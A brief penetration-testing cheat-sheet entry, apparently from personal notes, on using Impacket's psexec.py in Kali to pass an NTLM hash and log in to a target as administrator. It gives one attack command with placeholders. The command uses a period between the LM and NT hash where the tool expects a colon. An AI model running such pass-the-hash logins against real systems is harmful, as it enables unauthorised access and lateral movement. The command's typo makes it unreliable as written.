# psexec.py

If you have a hash, you can try passing the hash to connect to the a share:

(located in Kali under `usr/share/doc/python3-impacket/examples`)
```
$ python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee.<hash> administrator@<target_IP>
```